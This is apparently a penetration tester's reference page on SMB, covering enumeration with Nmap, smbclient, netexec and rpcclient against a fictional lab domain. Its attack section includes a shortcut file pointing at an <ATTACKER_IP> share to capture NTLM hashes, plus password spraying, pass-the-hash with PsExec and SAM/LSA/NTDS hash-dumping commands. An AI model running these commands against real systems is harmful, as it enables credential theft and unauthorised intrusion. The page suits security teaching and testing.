---
title: SMB
description: Server Message Block
categories: [Services]
tags: [Services, SMB]
weight: 2
---

## Service Info
- Name: Server Message Block (SMB)
- Purpose: Sharing of network resources.
- Listening port: **139 TCP (NetBIOS)**, **445 TCP**
- OS: Windows, Unix-Like (Samba)

**Server Message Block (SMB)** is a client-server protocol that regulates access to file shares and network resources like printers and named pipes. It was originally built on **Network Basic Input/Output System (NetBIOS)**, a network API created by IBM that provided computer naming, session, and datagram services. Since Windows 2000, SMB can run directly over TCP on port 445. Legacy SMB over NetBIOS uses TCP port 139 for sessions; NetBIOS name and datagram services use ports 137 (TCP/UDP) and 138 (UDP), respectively.

Samba is an open-source implementation of SMB that runs on Linux systems and is compatible with Windows SMB. Samba also comes with utilities like `smbclient` and `rpcclient` that are very useful for interacting with Windows and Samba SMB servers.

## Nmap
Nmap Enumeration Scan with `smb-protocols` and `smb2-security-mode` scripts:
```shell-session
$ sudo nmap 10.10.0.5 -sV --script=smb-protocols,smb2-security-mode -p445
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-12 20:04 -0600
Nmap scan report for 10.10.0.5
Host is up (0.0018s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
| smb-protocols:
|   dialects:
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds
```
- The `smb-protocols` script identifies available SMB dialects. SMBv1 support alone does not establish [EternalBlue](https://learn.microsoft.com/en-us/security-updates/Securitybulletins/2017/ms17-010) vulnerability; the Windows version and patch level also matter.
- The `smb2-security-mode` script identifies whether SMB signing is required. If signing is not required, the host may be a target for an [SMB relay attack](http://leikah.haoyingcao.xyz/en/docs/active_directory/initial_access/smb_relay/), subject to authentication policy and the relayed account's permissions.

## SMB File Share Enumeration
If we have access to a user's credentials, or the guest account is enabled, we can use `smbclient` to list out the shares available:
```shell-session
$ smbclient -L //10.10.0.5 -U 'amuro.ray' --password='Password1'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        IPC$            IPC       Remote IPC
        Myshare         Disk
```

Alternatively, use [netexec](https://www.netexec.wiki/), a successor to CrackMapExec.
```shell-session
$ nxc smb 10.10.0.5 -u 'amuro.ray' -p 'Password1' --shares
SMB         10.10.0.5       445    MSN-04-SAZABI    [*] Windows Server 2022 Build 20348 x64 (name:MSN-04-SAZABI) (domain:GUNDAM.local) (signing:False) (SMBv1:False)
SMB         10.10.0.5       445    MSN-04-SAZABI    [+] GUNDAM.local\amuro.ray:Password1
SMB         10.10.0.5       445    MSN-04-SAZABI    [*] Enumerated shares
SMB         10.10.0.5       445    MSN-04-SAZABI    Share           Permissions     Remark
SMB         10.10.0.5       445    MSN-04-SAZABI    -----           -----------     ------
SMB         10.10.0.5       445    MSN-04-SAZABI    ADMIN$                          Remote Admin
SMB         10.10.0.5       445    MSN-04-SAZABI    C$                              Default share
SMB         10.10.0.5       445    MSN-04-SAZABI    CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.0.5       445    MSN-04-SAZABI    IPC$            READ            Remote IPC
SMB         10.10.0.5       445    MSN-04-SAZABI    Myshare         READ,WRITE
```
### Browsing SMB Shares
We can use `smbclient` to browse an SMB share.
```shell-session
$ smbclient //10.10.0.5/Myshare -U 'amuro.ray' --password='Password1'
Try "help" to get a list of possible commands.
smb: \>
```
`smbclient` provides a command line interface similar to that of the FTP client.
- `ls` to list current directory
- `cd` to change directory
- `get` to download file
- `put` to upload file
- `!<cmd>` to execute a command on the local machine

The `help` command shows a comprehensive list of commands.
```shell-session
smb: \> help
?              allinfo        altname        archive        backup
blocksize      cancel         case_sensitive cd             chmod
chown          close          del            deltree        dir
du             echo           exit           get            getfacl
geteas         hardlink       help           history        iosize
lcd            link           lock           lowercase      ls
l              mask           md             mget           mkdir
mkfifo         more           mput           newer          notify
open           posix          posix_encrypt  posix_open     posix_mkdir
posix_rmdir    posix_unlink   posix_whoami   print          prompt
put            pwd            q              queue          quit
readlink       rd             recurse        reget          rename
reput          rm             rmdir          showacls       setea
setmode        scopy          stat           symlink        tar
tarmode        timeout        translate      unlock         volume
vuid           wdel           logon          listconnect    showconnect
tcon           tdis           tid            utimes         logoff
..             !
```
#### Test Write Access
If we connected to an SMB share as guest or via a null session, there is a possibility we can write to the share. Depending on its purpose, this may have noteworthy security implications. For example, it could allow malicious phishing files to be placed in an office file share.

To test guest/null write access, we create a test file and use the `put` command to upload it.
```shell-session
smb: \> !touch test.txt
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kB/s) (average 0.0 kB/s)
smb: \> ls
  .                                   D        0  Fri Dec 12 21:16:33 2025
  ..                                DHS        0  Fri Dec 12 11:49:58 2025
  test.txt                            A        0  Fri Dec 12 21:16:33 2025

                16588031 blocks of size 4096. 13375101 blocks available
```

### Mounting SMB Share
Alternatively, we can also browse the SMB share by mounting it to our local file system. It requires the `cifs-utils` package to be installed on your Linux system.
```bash
mkdir smb_share
sudo mount -t cifs //10.10.0.5/Myshare smb_share/ -o rw,user=amuro.ray,password=Password1
```
After mounting the share, we can navigate through it as if it's part of our local file system. When we're done working with this share, we can disconnect it from our local file system by unmounting it.
```bash
sudo umount smb_share/
```

If we can no longer connect to the SMB share, use `-f` option to force unmount.
```bash
sudo umount -f smb_share/
```

### Spidering SMB File Shares
We may also utilize tools to explore SMB shares in an automated manner. The `spider_plus` module for NetExec facilitates this from a Linux perspective.
```bash
nxc smb <host> -u <user> -p <password> -M spider_plus
```

NetExec explores shares readable by the current user, subject to its filters, and saves a JSON-formatted list of readable files to disk.
```shell-session
╭─brian@rx-93-nu ~
╰─$ nxc smb 10.10.0.3 -u amuro.ray -p 'Password1' -M spider_plus
SMB         10.10.0.3       445    RA-CAILUM        [*] Windows 11 / Server 2025 Build 26100 x64 (name:RA-CAILUM) (domain:GUNDAM.local) (signing:False) (SMBv1:None)
SMB         10.10.0.3       445    RA-CAILUM        [+] GUNDAM.local\amuro.ray:Password1
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*]  OUTPUT_FOLDER: /home/brian/.nxc/modules/nxc_spider_plus
SMB         10.10.0.3       445    RA-CAILUM        [*] Enumerated shares
SMB         10.10.0.3       445    RA-CAILUM        Share           Permissions     Remark
SMB         10.10.0.3       445    RA-CAILUM        -----           -----------     ------
SMB         10.10.0.3       445    RA-CAILUM        ADMIN$                          Remote Admin
SMB         10.10.0.3       445    RA-CAILUM        C$                              Default share
SMB         10.10.0.3       445    RA-CAILUM        CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.0.3       445    RA-CAILUM        F$                              Default share
SMB         10.10.0.3       445    RA-CAILUM        hangar          READ,WRITE
SMB         10.10.0.3       445    RA-CAILUM        IPC$            READ            Remote IPC
SMB         10.10.0.3       445    RA-CAILUM        NETLOGON        READ            Logon server share
SMB         10.10.0.3       445    RA-CAILUM        SYSVOL          READ            Logon server share
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [+] Saved share-file metadata to "/home/brian/.nxc/modules/nxc_spider_plus/10.10.0.3.json".
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] SMB Shares:           8 (ADMIN$, C$, CertEnroll, F$, hangar, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] SMB Readable Shares:  5 (CertEnroll, hangar, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] SMB Writable Shares:  1 (hangar)
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] Total folders found:  22
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] Total files found:    9
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] File size average:    1.42 KB
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] File size min:        22 B
SPIDER_PLUS 10.10.0.3       445    RA-CAILUM        [*] File size max:        6.2 KB
```

From the Windows perspective, we may make use of [Snaffler](https://github.com/SnaffCon/Snaffler), a tool designed to find user credentials stored in cleartext within file shares.
```
Snaffler.exe -s -d <domain_fqdn> -o snaffler.log -v data
```
- `-s`: prints to console
- `-o`: write results to log
- `-v`: verbose
    - `data` is best for console output

Snaffler can produce a substantial amount of output. It is best to let it run and review its logs later.

### SMB Null Session
Older versions of SMB may be configured to allow access to certain network resources when no username or password is provided.
```bash
smbclient -N -U "" -L //10.0.0.5
```
```bash
nxc smb 10.10.0.5 -u '' -p ''
```

## SMB User Enumeration
We can enumerate users on a Windows machine or in an Active Directory domain.

### RID Brute Force
If we can obtain a set of valid credentials, we can use it to conduct an **RID Brute Force** attack, which finds users and groups by obtaining an account-domain **Security Identifier (SID)** and appending different **Relative Identifiers (RIDs)** to it. The results depend on the target and the RID range queried; the examples below enumerate the target machine's local accounts, not every account in the AD domain.

We can use the `--rid-brute` option in `netexec`:
```shell-session
$ nxc smb 10.10.0.5 -u 'amuro.ray' -p 'Password1' --rid-brute
SMB         10.10.0.5       445    MSN-04-SAZABI    [*] Windows Server 2022 Build 20348 x64 (name:MSN-04-SAZABI) (domain:GUNDAM.local) (signing:False) (SMBv1:False)
SMB         10.10.0.5       445    MSN-04-SAZABI    [+] GUNDAM.local\amuro.ray:Password1
SMB         10.10.0.5       445    MSN-04-SAZABI    500: MSN-04-SAZABI\Administrator (SidTypeUser)
SMB         10.10.0.5       445    MSN-04-SAZABI    501: MSN-04-SAZABI\Guest (SidTypeUser)
SMB         10.10.0.5       445    MSN-04-SAZABI    503: MSN-04-SAZABI\DefaultAccount (SidTypeUser)
SMB         10.10.0.5       445    MSN-04-SAZABI    504: MSN-04-SAZABI\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.0.5       445    MSN-04-SAZABI    513: MSN-04-SAZABI\None (SidTypeGroup)
SMB         10.10.0.5       445    MSN-04-SAZABI    1000: MSN-04-SAZABI\Char.Aznable (SidTypeAlias)
```
Alternatively, use `lookupsid.py` from the Impacket library:
```shell-session
$ lookupsid.py amuro.ray:'Password1'@10.10.0.5
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at 10.10.0.5
[*] StringBinding ncacn_np:10.10.0.5[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2157690859-2819111861-1098670742
500: MSN-04-SAZABI\Administrator (SidTypeUser)
501: MSN-04-SAZABI\Guest (SidTypeUser)
503: MSN-04-SAZABI\DefaultAccount (SidTypeUser)
504: MSN-04-SAZABI\WDAGUtilityAccount (SidTypeUser)
513: MSN-04-SAZABI\None (SidTypeGroup)
1000: MSN-04-SAZABI\Char.Aznable (SidTypeAlias)
```

### SMB Brute Forcing
We can also obtain a valid set of credentials by conducting a brute-force attack
```bash
nxc smb 10.10.0.5 -u user.txt -p password.txt
```

Our brute force attacks can be more productive if we either:
- Have lists of existing credentials we collected from elsewhere
- Or have a list of users and one valid password. This is called a **password spraying attack**.

To conduct a password spraying attack with `netexec`, set the `-u` argument to the filename of the list of users, and `-p` argument to the plaintext password you would like to spray.
```bash
nxc smb 10.10.0.5 -u user.txt -p 'Password1'
```

## RPC Enumeration
We can also use `rpcclient`, a utility from Samba, to enumerate information about the SMB service. It interacts with MSRPC endpoints such as SAMR, LSARPC, and LSARPC-DS through named pipes. Much like `smbclient`, `rpcclient` also presents us with a command line interface once we establish a connection.
```shell-session
$ rpcclient -U 'gundam.local\char.aznable' --password='Password1' 10.10.0.5
rpcclient $>
```

We can glean quite a bit of information from interacting with various MSRPC endpoints through `rpcclient`. Here are a few commands that can help us enumerate the SMB Service, the host it's running on, and even its Active Directory domain if it's joined to one.

### Server Enumeration
`srvinfo` displays server information. The output below says the host at 10.10.0.5 is:
- A Windows NT-based OS
- Version 10.0 (Windows 10 / 11 / Server 2016+)
- Advertising both workstation and server services
- Identified as a ServerNT system
```shell-session
rpcclient $> srvinfo
        10.10.0.5      Wk Sv NT SNT
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9003
```

`enumdomains` enumerates the local domain name. On a non-domain controller machine, the machine name will show up as the domain and it **does not necessarily mean** this machine is not joined to an AD domain.
```shell-session
rpcclient $> enumdomains
name:[MSN-04-SAZABI] idx:[0x0]
name:[Builtin] idx:[0x0]
```

`querydominfo` queries information about the selected account domain, which is the machine's local account domain in this example.
```shell-session
rpcclient $> querydominfo
Domain:         MSN-04-SAZABI
Server:
Comment:
Total Users:    3
Total Groups:   1
Total Aliases:  1
Sequence No:    3
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x0
```

### Share Enumeration
The command `netshareenumall` enumerates all available SMB shares.
```shell-session
rpcclient $> netshareenumall
netname: ADMIN$
        remark: Remote Admin
        path:   C:\Windows
        password:       (null)
netname: C$
        remark: Default share
        path:   C:\
        password:       (null)
netname: CertEnroll
        remark: Active Directory Certificate Services share
        path:   C:\Windows\system32\CertSrv\CertEnroll
        password:       (null)
netname: IPC$
        remark: Remote IPC
        path:
        password:       (null)
netname: Myshare
        remark:
        path:   C:\Myshare
        password:       (null)
```

To get info on a particular share, use `netsharegetinfo <share>`
```shell-session
rpcclient $> netsharegetinfo Myshare
netname: Myshare
        remark:
        path:   C:\Myshare
        password:       (null)
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE
DACL
        ACL     Num ACEs:       2       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x03 SEC_ACE_FLAG_OBJECT_INHERIT  SEC_ACE_FLAG_CONTAINER_INHERIT
                Specific bits: 0x1ff
                Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS
                SID: S-1-5-32-544

        ACE
                type: ACCESS ALLOWED (0) flags: 0x03 SEC_ACE_FLAG_OBJECT_INHERIT  SEC_ACE_FLAG_CONTAINER_INHERIT
                Specific bits: 0x1ff
                Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS
                SID: S-1-1-0

        Owner SID:      S-1-5-21-790304770-1385196242-1780550448-500
        Group SID:      S-1-5-21-790304770-1385196242-1780550448-513
```

### User Enumeration
`enumdomusers` enumerates users in the selected account domain: local users on a member machine, or AD domain users when querying a domain controller.
```shell-session
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[DefaultAccount] rid:[0x1f7]
user:[Guest] rid:[0x1f5]
user:[WDAGUtilityAccount] rid:[0x1f8]
```

`queryuser <RID>` provides information on a specific user. The `<RID>` argument should be in the hexadecimal format provided in the output of `enumdomusers` command.
```shell-session
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Tue, 24 Jun 2025 21:12:28 CDT
        Logoff Time              :      Wed, 31 Dec 1969 18:00:00 CST
        Kickoff Time             :      Wed, 13 Sep 30828 21:48:05 CDT
        Password last set Time   :      Fri, 06 Jun 2025 15:18:17 CDT
        Password can change Time :      Fri, 06 Jun 2025 15:18:17 CDT
        Password must change Time:      Wed, 13 Sep 30828 21:48:05 CDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000000a
        padding1[0..7]...
        logon_hrs[0..21]...
```

### Domain Enumeration
`lsaquery` retrieves the Active Directory domain name and its **Security Identifier (SID)**
```shell-session
rpcclient $> lsaquery
Domain Name: GUNDAM
Domain Sid: S-1-5-21-790304770-1385196242-1780550448
```
We can also find the SIDs of individual users with the `lookupnames <username>` command. Conversely, we can lookup the name of a SID with the `lookupsids <SID>` command.
```shell-session
rpcclient $> lookupnames char.aznable
char.aznable S-1-5-21-2157690859-2819111861-1098670742-1000 (Local Group: 4)
rpcclient $> lookupsids S-1-5-21-2157690859-2819111861-1098670742-1000
S-1-5-21-2157690859-2819111861-1098670742-1000 MSN-04-SAZABI\Char.Aznable (4)
```

## SMB Attacks
This section deals with attacks that we can carry out using SMB. Note that some techniques here require at least local admin privileges.

### Shortcut Icon NTLM Coercion
On affected Windows versions and configurations, processing a shortcut that references a remote SMB location may cause Windows Explorer to connect and attempt authentication. Behavior depends on patches and outbound SMB/NTLM policy; it is not guaranteed for every user or system.

The text below is an Internet Shortcut (`.url`) example, not a binary Shell Link (`.lnk`). Do not rename this text to `.lnk`. It illustrates a remote icon reference, not a verified reproduction of CVE-2025-50154, whose published research concerns Shell Link processing:
```txt
[InternetShortcut]
URL=placeholder
WorkingDirectory=placeholder
IconFile=\\<ATTACKER_IP>\share\icon.ico
IconIndex=1
```
If an SMB share is visited regularly by users on a network and we have write access to it, we can place the shortcut file on the share and launch Responder to capture any resulting NTLM authentication.
```bash
sudo responder -I <INTERFACE> -v
```
If Windows Explorer processes the remote icon reference and outbound SMB/NTLM authentication is permitted, Responder may capture the user's NetNTLMv2 challenge-response material.
```shell-session
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.39.50
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:<REDACTED>
[...]
```
Captured NetNTLMv2 challenge-response material can be used for offline password cracking; it is not the account's reusable NT hash. NTLM relay instead forwards a live authentication exchange to another service, subject to protections such as required SMB signing. A saved capture cannot simply be replayed to an arbitrary server.
```bash
hashcat -m 5600 -O <NTLMv2-FILE> <WORDLIST>
```
{{% alert title="Note" %}}The same technique may apply to shortcuts in local directories visited by other users, subject to the same Windows version, patch, and authentication-policy constraints.{{% /alert %}}
### PsExec Remote Code Execution
PsExec is a utility in the Windows Sysinternals suite that allows administrators to execute commands remotely. It deploys a service executable through the target's SMB share (`ADMIN$` by default), starts the service, and communicates through named pipes. Administrator-level privileges on the target are required for this method.

Attackers can also abuse this mechanism to get code execution. PsExec is implemented in the Impacket Library, Netexec, and Metasploit. Below is an example of using Impacket `psexec.py`:
```bash
psexec.py <USER>:<PASS>@<HOST>
```

Pass-The-Hash can also be used if we have the NT hash of the admin user:
```bash
psexec.py <USER>@<HOST> -hashes 00000000000000000000000000000000:<NT_HASH>
```

### Hash Dumping
With local admin privileges, we can use NetExec to dump hashes in SAM, LSA, and NTDS.dit if we have access to a domain controller as a domain admin.

SAM dumping:
```bash
nxc smb <HOST> -u <USER> -p <PASSWORD> --sam
```

LSA dumping:
```bash
nxc smb <HOST> -u <USER> -p <PASSWORD> --lsa
```

NTDS.dit (on a DC with Domain Admin access):
```bash
nxc smb <HOST> -u <USER> -p <PASSWORD> --ntds
```
